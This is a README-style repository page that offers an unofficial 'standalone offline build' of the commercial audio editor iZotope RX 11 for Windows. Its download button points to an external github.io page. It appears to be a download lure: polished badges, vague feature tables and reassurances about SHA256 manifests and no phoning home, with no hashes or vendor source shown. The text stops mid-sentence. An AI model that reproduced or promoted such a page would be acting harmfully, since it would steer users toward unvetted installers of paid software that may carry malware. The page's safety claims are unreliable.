<div align="center">

# 🎧 iZotope RX 11 2026: Standalone Offline Build for Windows 11

<img src="https://img.shields.io/badge/platform-windows_10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform"> <img src="https://img.shields.io/badge/release-v2026.1-24292F?style=for-the-badge" alt="Release"> <img src="https://img.shields.io/badge/updated-2026--11--14-6E7781?style=for-the-badge" alt="Updated"> <img src="https://img.shields.io/badge/status-stable-2EA043?style=for-the-badge" alt="Status"> <img src="https://img.shields.io/badge/languages-12%2B-8250DF?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages">

</div>

## 📦 Intro

This repository distributes a standalone offline Windows x64 build packaged for the iZotope RX 11 workflow on Windows 10 and 11. The distribution package bundles the runtime, support libraries, and default configuration into a self-contained setup that requires no external fetches after retrieval. It targets workstations that require a reproducible, air-gapped deployment path.

The deployment audience includes audio engineers working in isolated or bandwidth-constrained environments, lab operators maintaining reproducible installs, and developers who need a known-good revision pinned outside of any vendor update channel. Offline deployment here means capturing the build once, verifying it via SHA256, and reinstalling the same artifact across machines without depending on the upstream vendor's availability. The build is not coupled to any online account service and does not phone home during normal operation.

The standalone build handles multitrack audio, spectral repair, and batch processing across common container formats (WAV, AIFF, FLAC, MP3, MP4). A single iZotope RX 11 on Windows deployment covers both portable mode and standard installed mode, with matching feature sets in either path.

## 01 · ⬇️ Download

<p align="center">
  <a href="https://brave-shell-07.github.io/izotope-rx-11-desktop/">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
      <img src="docs/buttons/installer-card.svg" alt="" width="440">
    </picture>
  </a>
</p>

<p align="center">
  <img src="docs/buttons/banner.png" alt="iZotope RX 11 2026 standalone build running on Windows 11, interface banner" width="100%">
</p>

## 02 · ✨ Features

<table>
<tr>
<td width="33%" valign="top">

**📦 Self-Contained Package**

Ships runtime, libraries, and defaults in one bundle with no post-install network fetch.

</td>
<td width="33%" valign="top">

**🔐 SHA256 Manifest**

Each artifact is published with a hash manifest so deployments can be verified end to end.

</td>
<td width="33%" valign="top">

**♻️ Reproducible Setup**

Pinned revision numbers allow identical reinstall across air-gapped workstations.

</td>
</tr>
<tr>
<td valign="top">

**🎚️ Multitrack Audio**

Handles multitrack sessions and spectral processing across standard container formats.

</td>
<td valign="top">

**🗂️ Portable Mode**

Optional portable layout writes configuration beside the binary for USB or shared drive use.

</td>
<td valign="top">

**🌐 Multilingual UI**

Interface strings ship in twelve languages, selected at first launch or via config file.

</td>
</tr>
</table>

## 03 · ⚙️ How it works

The installer lays down the program directory under the per-user program files path by default, alongside a support directory containing runtime libraries, locale bundles, and default presets. User-level configuration and recent project state are written to the roaming profile path on first save. No content is placed in Windows system directories, and no global registry keys are created outside of the HKCU hive.

First launch performs one-time initialization: the build registers its shell integration, populates the default config store under `%APPDATA%`, and probes the audio subsystem for supported device endpoints. If the audio subsystem reports no endpoints, the build starts with a null output and logs a warning to the application log. Nothing is written outside the user profile during this step.

Day to day, the build operates fully offline and does not require a network connection after the retrieval step is complete. Updates are handled by running a newer versioned artifact over the existing install; the installer preserves user projects, templates, and preferences in place. There is no background updater service and no scheduled check.

Integration surface is limited to shell file associations (optional during setup), the HKCU registry hive for per-user settings, and the Windows audio subsystem for device enumeration. Coexistence with other versions of similar software is supported through per-user install scope; two builds can remain installed side by side because each writes to its own application data folder.

## 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on x64 only; both Home and Pro editions are supported, along 